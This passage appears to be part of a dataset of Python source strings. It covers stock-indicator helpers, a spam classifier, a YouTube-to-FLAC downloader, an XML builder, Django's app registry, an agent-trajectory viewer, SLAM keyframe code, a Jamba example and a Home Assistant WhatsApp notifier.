(~(\u8f93\u5165.astype(bool))).astype(int)\n    # \u5f97\u5230\u8fde\u7eed\u76841\u6709\u591a\u5c11\u4e2a\n    # \u505a\u4e00\u6b21\u524d\u7f00\u548c\n    mask = np.insert(\u8f93\u5165, 0, 0)\n    sum_m = np.cumsum(mask)\n    # \u53d6\u51fa0\u7684\u4f4d\u7f6e\u7684\u503c\n    sum_0 = sum_m[mask == 0]\n    # \u8fd9\u4e9b\u4f4d\u7f6e\u7684\u503c\u53bb\u91cd\u76f8\u51cf\uff0c\u5c31\u662f\u6bcf\u4e2a\u8fde\u7eed\u76841\u7684\u6570\u91cf\n    continue1 = np.diff(np.unique(sum_0))\n    # \u628a1\u53d8\u62100\u7684\u4f4d\u7f6e\u7684\u503c\u53d8\u6210\u8fde\u7eed\u76841\u7684\u6570\u91cf\u7684\u8d1f\u6570\n    temp = \u8f93\u5165.copy()\n    position = np.where(np.diff(\u8f93\u5165) == -1)[0] + 1\n    temp[position] = -continue1\n    # \u6c42\u524d\u7f00\u548c\uff0c\u4ece1\u53d8\u62100\u65f6\uff0c\u4f1a\u81ea\u52a8\u52a0\u4e0a\u8fde\u7eed\u76841\u7684\u4e2a\u6570\u7684\u8d1f\u6570\uff0c\u5219\u81ea\u52a8\u6b63\u786e\n    \u591a\u65b9\u6301\u7eed\u65f6\u95f4 = np.cumsum(temp)\n    return \u591a\u65b9\u6301\u7eed\u65f6\u95f4\n\ndef hhv(a, n):\n    try:\n        test = pd.DataFrame()\n        test[\"a\"] = a\n        ans = test[\"a\"].rolling(n).max().values\n        return ans\n    except:\n\n        try:\n            a.tolist()\n        except:\n            1\n        try:\n            n.tolist()\n        except:\n            1\n        return np.array(maxBarslast(a, n))\n\n\ndef llv(a, n):\n    try:\n        n=int(n)\n        test = pd.DataFrame()\n        test[\"a\"] = a\n        ans = test[\"a\"].rolling(n).min().values\n        return ans\n    except:\n\n        try:\n            a.tolist()\n        except:\n            1\n        try:\n            n.tolist()\n        except:\n            1\n        return np.array(minBarslast(a,n))\n\n\n\n\n\n\n# def sma(S, N, M=1):  # \u4e2d\u56fd\u5f0f\u7684SMA,\u81f3\u5c11\u9700\u8981120\u5468\u671f\u624d\u7cbe\u786e\n#     K = pd.Series(S).rolling(N).mean()  # \u5148\u6c42\u51fa\u5e73\u5747\u503c\n#     for i in range(N + 1, len(S)):  K[i] = (M * S[i] + (N - M) * K[\n#         i - 1]) / N  # \u56e0\u4e3a\u8981\u53d6K[i-1]\uff0c\u6240\u4ee5 range(N+1, len(S))\n#     return K\ndef sma(S, N, M):  # 3\uff09\u9ad8\u6548\u5199\u6cd53\n    try:\n        return pd.Series(S).ewm(span=2 * N / M - 1, adjust=True).mean().values\n    except:\n        try:\n            try:\n                M.tolist()\n            except:\n                1\n            return SMA_M\u53d8\u52a8(S, N, M)\n        except:\n            try:\n                try:\n                    N.tolist()\n                except:\n                    1\n                return SMA_N\u53d8\u52a8(S, N, M)\n            except:\n                try:\n                    try:\n                        M.tolist()\n                    except:\n                        1\n                    try:\n                        N.tolist()\n                    except:\n                        1\n                    return SMA_\u53cc\u53d8\u52a8(S, N, M)\n                except:\n                    1\n\n\nfrom numba import jit, njit\n@jit(nopython=True)\ndef SMA_\u53cc\u53d8\u52a8(arr, n_values, m_values):\n    result = []\n    y = 0\n    n_index = 0\n    m_index = 0\n\n    for x in arr:\n        if x != x:  # Check if x is NaN (NaN values are not equal to themselves)\n            x = 0  # Replace NaN with 0\n\n        n = int(n_values[n_index])  # Get the corresponding n value for the current data point\n        n_index += 1  # Move to the next index for n_values\n\n        m = int(m_values[m_index])  # Get the corresponding m value for the current data point\n        m_index += 1  # Move to the next index for m_values\n\n        y = (m * x + (n - m) * y) / n\n        result.append(y)\n\n    return result\n\n\n@jit(nopython=True)\ndef SMA_N\u53d8\u52a8(arr, n, m_values):\n    m = int(m_values)\n    y = 0\n    result = []\n    for x, n in zip(arr, n):\n        if isinstance(x, float) and np.isnan(x):  # \u5224\u65ad\u662f\u5426\u4e3a NaN \u503c\n            x = 0  # \u66ff\u6362 NaN \u503c\u4e3a 0\n        y = (m * x + (n - m) * y) / n\n        result.append(y)\n    return result\n\n\n@jit(nopython=True)\ndef SMA_M\u53d8\u52a8(arr, n, m_values):\n    n = int(n)\n    y = 0\n    result = []\n    m_index = 0  # Initialize an index to track the current m value\n    for x in arr:\n        m = m_values[m_index] if m_index < len(m_values) else m_values[-1]  # Use last value if not enough values in m_values\n        if np.isnan(x):\n            x = np.nan_to_num(x)\n        y = (m * x + (n - m) * y) / n\n        result.append(y)\n        m_index += 1  # Move to the next m value\n    return np.array(result)\n\ndef SMA_CN(arr, n, m):\n    n = int(n)\n    m = int(m)\n    y = 0\n    result = []\n    for x in arr:\n        if np.isnan(x):\n            x = np.nan_to_num(x)\n        y = (m * x + (n - m) * y) / n\n        result.append(y)\n    return np.array(result)\n\n\n\n\ndef EMA(S, N):  # \u4e3a\u4e86\u7cbe\u5ea6 S>4*N  EMA\u81f3\u5c11\u9700\u8981120\u5468\u671f\n    try:\n        return pd.Series(S).ewm(span=N, adjust=False).mean().values\n    except:\n        try:\n            S.tolist()\n ",
    "#import packages\nimport pandas as pd\nimport numpy as np\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.feature_extraction.text import CountVectorizer\nfrom sklearn.naive_bayes import MultinomialNB\n\n#import data\nspam_df = pd.read_csv('spam.csv')\n#inspect data\nspam_df.groupby('Category').describe()\n#convert spam column to binary\nspam_df['spam'] = spam_df['Category'].apply(lambda x: 1 if x=='spam' else 0)\n#create train/test split\nx_train, x_test, y_train, y_test = train_test_split(spam_df.Message, spam_df.spam, test_size=0.25)\n#find word counts and store in a matrix\ncv=CountVectorizer()\nx_train_count = cv.fit_transform(x_train.values)\nx_train_count.toarray()\n#train the model\nmodel = MultinomialNB()\nmodel.fit(x_train_count, y_train)\n#test the model\n#pretest ham\nemail = ['Hey Bach, can we get together to watch football game tomorrow?']\nemail_count = cv.transform(email)\nprint(model.predict(email_count))\n#pretest spam\nemail = ['You have won a free vacation!']\nemail_count = cv.transform(email)\nprint(model.predict(email_count))\n#test the model\nx_test_count = cv.transform(x_test)\nprint(model.score(x_test_count, y_test))\n",
    "import os\r\nimport yt_dlp\r\nfrom mutagen.flac import FLAC, Picture\r\nfrom tqdm import tqdm\r\nfrom googlesearch import search\r\nimport requests\r\nfrom bs4 import BeautifulSoup\r\nfrom urllib.parse import urlparse, urljoin\r\n\r\ndef download_audio(url, output_path):\r\n    ydl_opts = {\r\n        'format': 'bestaudio/best',\r\n        'postprocessors': [{\r\n            'key': 'FFmpegExtractAudio',\r\n            'preferredcodec': 'flac',\r\n            'preferredquality': 'lossless',\r\n        }],\r\n        'outtmpl': os.path.join(output_path, '%(title)s.%(ext)s'),\r\n        'ignoreerrors': True,  # Ignore download errors\r\n        'progress_hooks': [progress_hook]\r\n    }\r\n\r\n    with yt_dlp.YoutubeDL(ydl_opts) as ydl:\r\n        info_dict = ydl.extract_info(url, download=True)\r\n        \r\n        # Check if the URL is for a playlist\r\n        if 'entries' in info_dict:\r\n            # Download all videos in the playlist\r\n            for entry in info_dict['entries']:\r\n                try:\r\n                    ydl.download([entry['webpage_url']])\r\n                    embed_album_cover(\r\n                        os.path.join(output_path, f\"{entry['title']}.flac\"),\r\n                        entry['title']\r\n                    )\r\n                except Exception as e:\r\n                    print(\"An error occurred while downloading:\", e)\r\n                    continue\r\n        else:\r\n            # Single video download\r\n            try:\r\n                ydl.download([url])\r\n                embed_album_cover(\r\n                    os.path.join(output_path, f\"{info_dict['title']}.flac\"),\r\n                    info_dict['title']\r\n                )\r\n            except Exception as e:\r\n                print(\"An error occurred while downloading:\", e)\r\n\r\ndef embed_album_cover(flac_file_path, query):\r\n    flac = FLAC(flac_file_path)\r\n    \r\n    # Extract artist and song name from the file title\r\n    file_title = os.path.splitext(os.path.basename(flac_file_path))[0]\r\n    artist_name, song_name = file_title.split(' - ', 1) if ' - ' in file_title else ('Unknown Artist', file_title)\r\n    \r\n    # Fetch album art URL from Google search\r\n    album_art_url = fetch_album_art(query)\r\n    if album_art_url:\r\n        print(\"Album art URL:\", album_art_url)  # Print the URL for debugging\r\n        with yt_dlp.YoutubeDL() as ydl:\r\n            thumbnail_data = ydl.urlopen(album_art_url).read()\r\n        picture = Picture()\r\n        picture.type = 3  # 3 represents the front cover\r\n        picture.data = thumbnail_data\r\n        flac.clear_pictures()\r\n        flac.add_picture(picture)\r\n        \r\n        # Embed artist and song name into metadata\r\n        flac['artist'] = artist_name\r\n        flac['title'] = song_name\r\n        \r\n        flac.save()\r\n    else:\r\n        print(\"Album art not found for:\", query)\r\n\r\ndef fetch_album_art(title):\r\n    for url in search(f'{title} album cover', num=5, stop=5):  # Increase the number of search results\r\n        print(\"Album art URL found:\", url)  # Print the URL for debugging\r\n        response = requests.get(url)\r\n        if response.status_code == 200:\r\n            soup = BeautifulSoup(response.content, 'html.parser')\r\n            meta_tags = soup.find_all('meta', property='og:image')\r\n            if meta_tags:\r\n                img_urls = [tag.get('content') for tag in meta_tags]\r\n                for img_url in img_urls:\r\n                    if img_url:\r\n                        print(\"Direct image URL:\", img_url)\r\n                        # Check if the URL is absolute\r\n                        if img_url.startswith(('http://', 'https://')):\r\n                            return img_url\r\n                        # If not, construct the absolute URL\r\n                        else:\r\n                            parsed_url = urlparse(url)\r\n                            base_url = f\"{parsed_url.scheme}://{parsed_url.netloc}\"\r\n                            return urljoin(base_url, img_url)\r\n            else:\r\n                print(\"No Open Graph image tag found on the webpage:\", url)\r\n        else:\r\n            print(\"Failed to fetch webpage:\", url)\r\n    return None\r\n\r\ndef progress_hook(d):\r\n    if d['status'] == 'downloading':\r\n        if 'total_bytes' in d:\r\n            pbar = tqdm(total=d['total_bytes'], unit='B', unit_scale=True, desc=d['filename'])\r\n            pbar.update(d['downloaded_bytes'])\r\n    elif d['status'] == 'finished':\r\n        tqdm.write(f'{d[\"filename\"]} downloaded')\r\n\r\n# Define the output directory for the FLAC file\r\noutput_path = r'CHANGE/THIS/TO/YOUR/PATH'\r\n\r\nwhile True:\r\n    # Prompt the user for a YouTube link\r\n    url = input(\"Enter the YouTube video URL (or type 'exit' to quit): \")\r\n    \r\n    if url.lower() == 'exit':\r\n        break\r\n\r\n    try:\r\n        # Download the audio (FLAC) and embed album cover\r\n        download_audio(url, output_path)\r\n        print(\"Download complete!\")\r\n    except Exception as e:\r\n        print(\"An error occurred:\", e)",
    "import xml.etree.ElementTree as ET\nfrom xml.dom import minidom\n\ndef prettify_xml(elem):\n    \"\"\"Return a pretty-printed XML string for the Element.\"\"\"\n    rough_string = ET.tostring(elem, 'utf-8')\n    reparsed = minidom.parseString(rough_string)\n    return reparsed.toprettyxml(indent=\"  \")\n\ndef add_node_with_attributes(current_node, part, root, nodeType):\n    \"\"\"Parse part with potential attributes and add to current_node.\"\"\"\n    part_name = part[0]  # Assuming it's always within <>\n    children = ET.SubElement(current_node, \"children\") if current_node != root else current_node\n    current_node = ET.SubElement(children, nodeType, name=part_name)\n\n    for item in part[1:]:\n        if ':' in item and not ':=' in item:\n            subvalues = item.split(':')\n            children = ET.SubElement(current_node, subvalues[0])                    \n            for i in subvalues:\n                if i:\n                    if '=' in i:\n                        for j in i.split(','):                        \n                            if '=' in j:\n                                sub_key, sub_value = j.split(\"=\")\n                                ET.SubElement(children, sub_key).text = sub_value\n                    else:\n                        if i != subvalues[0]:\n                            children = ET.SubElement(children, i)\n        elif ':=' in item:\n            tmp = item.split(':=')\n            children = ET.SubElement(current_node, tmp[0]).text = tmp[1]\n        else:\n            pass\n    return current_node\n\ndef create_xml_structure(command):\n    parts = command.split('//')\n\n    root = ET.Element(\"interfaceDefinition\")\n    current_node = root\n    for part in parts:\n        if part.startswith('<'):  # Adjust this condition as needed for broader applicability\n            part = part.replace('<','').replace('>','')\n            if '@' in part:\n                part = part.split('@')\n            current_node = add_node_with_attributes(current_node, part, root, 'tagNode')\n        elif part.startswith('!'):\n            part = part[1:]  # leafNode\n            if '@' in part:\n                part = part.split('@')\n            current_node = add_node_with_attributes(current_node, part, root, 'leafNode')\n            break  # No further nodes after a leafNode\n        else:  # Regular node\n            if '@' in part:\n                part = part.split('@')\n                current_node = add_node_with_attributes(current_node, part, root, 'node')\n            else:\n                # This handles regular nodes without any special attributes\n                if current_node == root:\n                    current_node = ET.SubElement(current_node, \"node\", name=part)\n                else:\n                    children = current_node if current_node.tag == \"children\" else ET.SubElement(current_node, \"children\")\n                    current_node = ET.SubElement(children, \"node\", name=part)\n\n\n    return prettify_xml(root)\n\n# Example usage\ncommand_input = input(\"Enter your command: \")\nprint('')\nxml_structure = create_xml_structure(command_input)\nprint(xml_structure)\n",
    "import functools\nimport sys\nimport threading\nimport warnings\nfrom collections import Counter, defaultdict\nfrom functools import partial\n\nfrom django.core.exceptions import AppRegistryNotReady, ImproperlyConfigured\n\nfrom .config import AppConfig\n\n\nclass Apps:\n    \"\"\"\n    A registry that stores the configuration of installed applications.\n\n    It also keeps track of models, e.g. to provide reverse relations.\n    \"\"\"\n\n    def __init__(self, installed_apps=()):\n        # installed_apps is set to None when creating the main registry\n        # because it cannot be populated at that point. Other registries must\n        # provide a list of installed apps and are populated immediately.\n        if installed_apps is None and hasattr(sys.modules[__name__], \"apps\"):\n            raise RuntimeError(\"You must supply an installed_apps argument.\")\n\n        # Mapping of app labels => model names => model classes. Every time a\n        # model is imported, ModelBase.__new__ calls apps.register_model which\n        # creates an entry in all_models. All imported models are registered,\n        # regardless of whether they're defined in an installed application\n        # and whether the registry has been populated. Since it isn't possible\n        # to reimport a module safely (it could reexecute initialization code)\n        # all_models is never overridden or reset.\n        self.all_models = defaultdict(dict)\n\n        # Mapping of labels to AppConfig instances for installed apps.\n        self.app_configs = {}\n\n        # Stack of app_configs. Used to store the current state in\n        # set_available_apps and set_installed_apps.\n        self.stored_app_configs = []\n\n        # Whether the registry is populated.\n        self.apps_ready = self.models_ready = self.ready = False\n        # For the autoreloader.\n        self.ready_event = threading.Event()\n\n        # Lock for thread-safe population.\n        self._lock = threading.RLock()\n        self.loading = False\n\n        # Maps (\"app_label\", \"modelname\") tuples to lists of functions to be\n        # called when the corresponding model is ready. Used by this class's\n        # `lazy_model_operation()` and `do_pending_operations()` methods.\n        self._pending_operations = defaultdict(list)\n\n        # Populate apps and models, unless it's the main registry.\n        if installed_apps is not None:\n            self.populate(installed_apps)\n\n    def populate(self, installed_apps=None):\n        \"\"\"\n        Load application configurations and models.\n\n        Import each application module and then each model module.\n\n        It is thread-safe and idempotent, but not reentrant.\n        \"\"\"\n        if self.ready:\n            return\n\n        # populate() might be called by two threads in parallel on servers\n        # that create threads before initializing the WSGI callable.\n        with self._lock:\n            if self.ready:\n                return\n\n            # An RLock prevents other threads from entering this section. The\n            # compare and set operation below is atomic.\n            if self.loading:\n                # Prevent reentrant calls to avoid running AppConfig.ready()\n                # methods twice.\n                raise RuntimeError(\"populate() isn't reentrant\")\n            self.loading = True\n\n            # Phase 1: initialize app configs and import app modules.\n            for entry in installed_apps:\n                if isinstance(entry, AppConfig):\n                    app_config = entry\n                else:\n                    app_config = AppConfig.create(entry)\n                if app_config.label in self.app_configs:\n                    raise ImproperlyConfigured(\n                        \"Application labels aren't unique, \"\n                        \"duplicates: %s\" % app_config.label\n                    )\n\n                self.app_configs[app_config.label] = app_config\n                app_config.apps = self\n\n            # Check for duplicate app names.\n            counts = Counter(\n                app_config.name for app_config in self.app_configs.values()\n            )\n            duplicates = [name for name, count in counts.most_common() if count > 1]\n            if duplicates:\n                raise ImproperlyConfigured(\n                    \"Application names aren't unique, \"\n                    \"duplicates: %s\" % \", \".join(duplicates)\n                )\n\n            self.apps_ready = True\n\n            # Phase 2: import models modules.\n            for app_config in self.app_configs.values():\n                app_config.import_models()\n\n            self.clear_cache()\n\n            self.models_ready = True\n\n            # Phase 3: run ready() methods of app configs.\n            for app_config in self.get_app_configs():\n                app_config.ready()\n\n            self.ready = True\n            self.ready_event.set()\n\n    def check_apps_ready(self):\n        \"\"\"Raise an exception if all apps haven't been imported yet.\"\"\"\n        if not self.apps_ready:\n            from django",
    "import http.server\nimport json\nimport os\nimport socketserver\nimport traceback\nimport yaml\n\nfrom pathlib import Path\nfrom argparse import ArgumentParser\nfrom functools import partial\n\n\ndef append_exit(content):\n    last_entry = content[\"history\"][-1]\n    if last_entry[\"role\"] == \"system\":\n        return content\n    \n    exit_status = content.get(\"info\", {}).get(\"exit_status\", None)\n\n    if exit_status is None:\n        return content\n\n    if exit_status.startswith(\"submitted\"):\n        if \"submission\" in content[\"info\"]:\n            submission = content[\"info\"][\"submission\"]\n            content[\"history\"].append({\n                \"role\": \"model_patch\",\n                \"content\": submission,\n            })\n        # else submission should be in history already\n        else:\n            raise ValueError(\"No submission in history or info\")\n    # elif content.get(\"info\", {}).get(\"exit_status\", None) is not None:\n    #     content[\"history\"].append({\n    #         \"role\": \"system\",\n    #         \"content\": f\"Exited - {content['info']['exit_status']}\",\n    #     })\n    return content\n\n\ndef append_patch(instance_id, content, patches, patch_type):\n    if content.get(\"info\", {}).get(\"exit_status\", None) is not None:\n        if instance_id in patches:\n            content[\"history\"].append({\n                \"role\": f\"{patch_type} Patch\",\n                \"content\": patches[instance_id],\n            })\n    return content\n\n\ndef append_results(traj_path, instance_id, content, results, results_file, scorecards, scorecards_file):\n    stats = []\n    model_stats = {}\n    if traj_path.exists():\n        data = json.loads(traj_path.read_text())\n        info = data.get(\"info\", {})\n        model_stats = info.get(\"model_stats\", {})\n    instance_cost = model_stats.get(\"instance_cost\", None)\n    instance_cost = f'{instance_cost:.2f}' if instance_cost is not None else 'N/A'\n    tokens_sent = model_stats.get(\"tokens_sent\", None)\n    tokens_sent = f'{tokens_sent:,}' if tokens_sent is not None else 'N/A'\n    tokens_received = model_stats.get(\"tokens_received\", None)\n    tokens_received = f'{tokens_received:,}' if tokens_received is not None else 'N/A'\n    api_calls = model_stats.get(\"api_calls\", None)\n    api_calls = f'{api_calls:,}' if api_calls is not None else 'N/A'\n    stats.append(f\"**** Run Stats ****\")\n    stats.append(f\"Instance Cost: ${instance_cost}\")\n    stats.append(f\"Tokens Sent: {tokens_sent}\")\n    stats.append(f\"Tokens Received: {tokens_received}\")\n    stats.append(f\"API Calls: {api_calls}\\n\")\n    status = []\n    if results is None:\n        status.append(\"Evaluation results not found\")\n    elif \"not_generated\" in results and \"generated\" in results and \"applied\" in results and \"resolved\" in results:\n        is_generated = instance_id in results[\"generated\"]\n        is_applied = instance_id in results[\"applied\"]\n        is_resolved = instance_id in results[\"resolved\"]\n\n        status.append(\"**** Statuses ****\")\n        status.append(\n            f\"  {'\u2705' if is_generated else '\u274c'} Generated (The agent was {'' if is_generated else 'not '}\"\n            \"able to generate a pull request to address this issue)\")\n        status.append(\n            f\"  {'\u2705' if is_applied else '\u274c'} Applied (The pull request was {'' if is_applied else 'not '}\"\n            \"successfully applied to the repo during eval)\")\n        status.append(\n            f\"  {'\u2705' if is_resolved else '\u274c'} Resolved (The pull request {'' if is_resolved else 'not '}\"\n            \"successfully resolved the issue during eval)\")\n    else:\n        status.append(\"Results format not recognized\")\n\n    if scorecards is not None:\n        scorecard = [x for x in scorecards if x[\"instance_id\"] == instance_id][0]\n        if \"test_results\" in scorecard and \"failure\" in scorecard[\"test_results\"] and (\n            len(scorecard[\"test_results\"][\"failure\"][\"FAIL_TO_PASS\"]) > 0 or\n            len(scorecard[\"test_results\"][\"failure\"][\"PASS_TO_PASS\"]) > 0\n        ):\n            tests_failing = [\n                f\"  - {x}\" for x in scorecard[\"test_results\"][\"failure\"][\"FAIL_TO_PASS\"]\n            ] + [\n                f\"  - {x}\" for x in scorecard[\"test_results\"][\"failure\"][\"PASS_TO_PASS\"]\n            ]\n            status.extend([\"\", \"**** Test Results ****\", \"\ud83e\uddea Tests Failed\"] + tests_failing[:7])\n            if len(tests_failing) > 7:\n                status.append(f\"  ... and {len(tests_failing) - 7} more\")\n            status.append(\"\")\n\n    if status == []:\n        status.append(\"Instance not found in results\")\n    else:\n        status.append(\"---------------------------\")\n        status.append(\"Note that the evaluation results here may not be accurate or up to date, since they are computed seperately from the agent run itself.\")\n        results_relative = results_file.resolve().relative_to(Path(__file__).resolve().parent.parent)\n        status.append(f\"Check {results_relative} for the most accurate evaluation results.\")\n        status.append(\"\")\n        status.append(f\"Instance ID: {instance",
    "import torch\nimport numpy as np\n\n\ndef get_forward_edges(B):\n    # Get forward consecutive keyframe edges\n    ref_ids = [b for b in range(0, B - 1)]\n    target_ids = [b for b in range(1, B)]\n    return ref_ids, target_ids\n\n\ndef get_backward_edges(B):\n    ref_ids = [b for b in range(1, B)]\n    target_ids = [b for b in range(0, B - 1)]\n    return ref_ids, target_ids\n\n\ndef calc_rotation_cos(poses1, poses2):\n    R1 = poses1[:, :3, :3]\n    R2 = poses2[:, :3, :3]\n    R12 = R1[:, None, :, :].mT @ R2[None, :, :, :]\n    trace_R12 = R12[:, :, 0, 0] + R12[:, :, 1, 1] + R12[:, :, 2, 2]\n    cos_theta = 0.5 * (trace_R12 - 1)\n    return cos_theta\n\n\ndef calc_scaled_dist(poses1, poses2, median_depths1):\n    dists = torch.cdist(\n        poses1[:, :3, 3],\n        poses2[:, :3, 3],\n        compute_mode=\"use_mm_for_euclid_dist_if_necessary\",\n    )\n    scaled_dists = dists / median_depths1[:, None]\n    return scaled_dists\n\n\ndef get_pose_pairs(poses1, median_depths1, poses2, cfg, mode):\n    scaled_dists = calc_scaled_dist(poses1, poses2, median_depths1)\n\n    if mode == \"nearest\":\n        inds2 = torch.arange(\n            scaled_dists.shape[1], device=poses1.device, dtype=torch.long\n        )\n        min_dists, inds1 = torch.min(scaled_dists, dim=0)\n    elif mode == \"radius\":\n        scaled_dists = calc_scaled_dist(poses1, poses2, median_depths1)\n        cos_theta = calc_rotation_cos(poses1, poses2)\n        cos_thresh = np.cos(cfg[\"degrees_thresh\"] * 3.14159 / 180.0)\n        valid_edges = torch.logical_and(\n            scaled_dists < cfg[\"radius_thresh\"], cos_theta > cos_thresh\n        )\n        inds1, inds2 = torch.nonzero(valid_edges, as_tuple=True)\n    elif mode == \"nearest_and_radius\":\n        # Ensure at least nearest is included, and then others from radius as well while avoiding duplicates\n        inds2_nearest = torch.arange(\n            scaled_dists.shape[1], device=poses1.device, dtype=torch.long\n        )\n        min_dists, inds1_nearest = torch.min(scaled_dists, dim=0)\n\n        scaled_dists = calc_scaled_dist(poses1, poses2, median_depths1)\n        cos_theta = calc_rotation_cos(poses1, poses2)\n        cos_thresh = np.cos(cfg[\"degrees_thresh\"] * 3.14159 / 180.0)\n        valid_edges = torch.logical_and(\n            scaled_dists < cfg[\"radius_thresh\"], cos_theta > cos_thresh\n        )\n        # Mask out nearest for remaining\n        valid_edges[inds1_nearest, inds2_nearest] = False\n\n        inds1_radius, inds2_radius = torch.nonzero(valid_edges, as_tuple=True)\n        inds1 = torch.cat((inds1_nearest, inds1_radius))\n        inds2 = torch.cat((inds2_nearest, inds2_radius))\n    else:\n        raise ValueError(\"get_pose_pairs mode: \" + mode + \" is not implemented.\")\n\n    return inds1, inds2\n\n\ndef get_kf_edges(poses, median_depths, cfg):\n    inds1, inds2 = get_pose_pairs(poses, median_depths, poses, cfg, mode=\"radius\")\n    # Avoid pose with itself and consecutive keyframes\n    valid_pairs = torch.abs(inds1 - inds2) > 1\n    ref_ids = inds1[valid_pairs].tolist()\n    target_ids = inds2[valid_pairs].tolist()\n    return ref_ids, target_ids\n\n\ndef get_closest_temporal(timestamps1, timestamps2):\n    dists = torch.abs(timestamps1[:, None] - timestamps2[None, :])\n    inds2 = torch.arange(dists.shape[1], device=timestamps1.device, dtype=torch.long)\n    min_dists, inds1 = torch.min(dists, dim=0)\n    return inds1, inds2\n\n\n# Get edges temporally (each one-way connected to the two keyframes it is between)\n# If recent frame is newer than last keyframe, then only one connection\n# NOTE: Timestamps ordered sequentially\ndef get_one_way_temporal_neighbors(kf_timestamps, recent_timestamps):\n    num_kf = len(kf_timestamps)\n    num_recent = len(recent_timestamps)\n\n    one_way_kf_ids = []\n    one_way_ids = []\n    kf_ind = -1\n\n    # Find first keyframe where recent frame can attach (kf_ind is kf behind)\n    while recent_timestamps[0] > kf_timestamps[kf_ind + 1]:\n        kf_ind += 1\n        if kf_ind == num_kf - 1:  # Reached last KF\n            break\n\n    # Find inds between two keyframes (always checking to kf behind)\n    r_ind = 0\n    if kf_ind < num_kf - 1:\n        while r_ind < num_recent:\n            if recent_timestamps[r_ind] > kf_timestamps[kf_ind + 1]:\n                kf_ind += 1\n            if kf_ind >= num_kf - 1:  # Reached last KF\n                break\n\n            one_way_kf_ids.append(kf_ind)  # KF behind\n            one_way_ids.append(r_ind)\n            one_way_kf_ids.append(kf_ind + 1)  # KF ahead\n            one_way_ids.append(r_ind)\n\n            r_ind += 1\n\n    # Rest of recent frames are newer than newest keyframe\n    while r_ind < num_recent:\n        one_way_kf_ids.append(kf_ind)\n        one_way_ids.append(r_ind)\n        r_ind += 1\n\n    return one_way_kf_ids, one_way_ids\n\n\ndef get_one_way_edges(\n    kf_poses, kf_median_depths, recent_poses, kf_timestamps, recent_timestamps, cfg\n):\n    device = kf_poses.device\n\n    if cfg[\"radius_thresh\"] > 0.0 and cfg[\"degrees_thresh\"] > 0.0:\n        one_way_kf_inds, one_way_inds = get_pose_pairs(\n ",
    "# Import the torch library, which provides tools for machine learning\nimport torch\n\n# Import the Jamba model from the jamba.model module\nfrom jamba.model import Jamba\n\n# Create a tensor of random integers between 0 and 100, with shape (1, 100)\n# This simulates a batch of tokens that we will pass through the model\nx = torch.randint(0, 100, (1, 100))\n\n# Initialize the Jamba model with the specified parameters\n# dim: dimensionality of the input data\n# depth: number of layers in the model\n# num_tokens: number of unique tokens in the input data\n# d_state: dimensionality of the hidden state in the model\n# d_conv: dimensionality of the convolutional layers in the model\n# heads: number of attention heads in the model\n# num_experts: number of expert networks in the model\n# num_experts_per_token: number of experts used for each token in the input data\nmodel = Jamba(\n    dim=512,\n    depth=6,\n    num_tokens=100,\n    d_state=256,\n    d_conv=128,\n    heads=8,\n    num_experts=8,\n    num_experts_per_token=2,\n)\n\n# Perform a forward pass through the model with the input data\n# This will return the model's predictions for each token in the input data\noutput = model(x)\n\n# Print the model's predictions\nprint(output)\n",
    "import logging\r\nimport json\r\nimport os\r\nfrom os.path import basename\r\nfrom urllib.parse import urlparse\r\nimport voluptuous as vol\r\nfrom whatsapp_api_client_python import API\r\nimport homeassistant.helpers.config_validation as cv\r\nfrom homeassistant.components.notify import (\r\n    ATTR_TARGET, ATTR_TITLE, ATTR_DATA, PLATFORM_SCHEMA, BaseNotificationService)\r\n\r\nATTR_INSTANCE = \"instance_id\"\r\nATTR_TOKEN = \"token\"\r\n\r\n\r\n_LOGGER = logging.getLogger(__name__)\r\n\r\nPLATFORM_SCHEMA = PLATFORM_SCHEMA.extend({\r\n    # vol.Required(ATTR_TARGET): cv.string,\r\n    vol.Required(ATTR_INSTANCE): cv.string,\r\n    vol.Required(ATTR_TOKEN): cv.string,\r\n    vol.Optional(ATTR_TITLE): cv.string,\r\n})\r\n\r\ndef get_service(hass, config, discovery_info=None):\r\n    \"\"\"Get the custom notifier service.\"\"\"\r\n    title = config.get(ATTR_TITLE)\r\n    token = config.get(ATTR_TOKEN)\r\n    instance_id = config.get(ATTR_INSTANCE)\r\n    return GreenAPINotificationService(title, token, instance_id)\r\n\r\nclass GreenAPINotificationService(BaseNotificationService):\r\n    \r\n    def __init__(self, title, token,instance_id):\r\n        \"\"\"Initialize the service.\"\"\"\r\n        self._title = title\r\n        self._token = token\r\n        self._instance_id = instance_id\r\n        self._greenAPI = API.GreenAPI(self._instance_id, self._token)\r\n\r\n    def send_message(self, message=\"\", **kwargs):\r\n        \r\n        \"\"\"Send a message to the target.\"\"\"\r\n        \r\n        try:\r\n            title = kwargs.get(ATTR_TITLE)\r\n            if title is not None:\r\n                title = f\"*{title}*\"\r\n                message = f\"{title} \\n {message}\"\r\n            data = kwargs.get(ATTR_DATA)\r\n            target = kwargs.get(ATTR_TARGET)[0]\r\n            _LOGGER.info(f\"Sending message to {target}\")\r\n            if data is not None:\r\n                file_path = data[\"file\"]\r\n                if os.path.exists(file_path):\r\n                    upload_file_response = self._greenAPI.sending.uploadFile(file_path)\r\n                    if upload_file_response.code == 200:\r\n                        url_file = upload_file_response.data[\"urlFile\"]\r\n                        url = urlparse(url_file)\r\n                        file_name = basename(url.path)\r\n                        send_file_by_url_response = self._greenAPI.sending.sendFileByUrl(target, url_file, file_name, caption=message)\r\n            else:\r\n                self._greenAPI.sending.sendMessage(target, message)\r\n        except Exception as e:\r\n            _LOGGER.error(\"Sending message to %s: has failed with the following error %s\", kwargs.get(ATTR_TARGET)[0] ,str(e))",
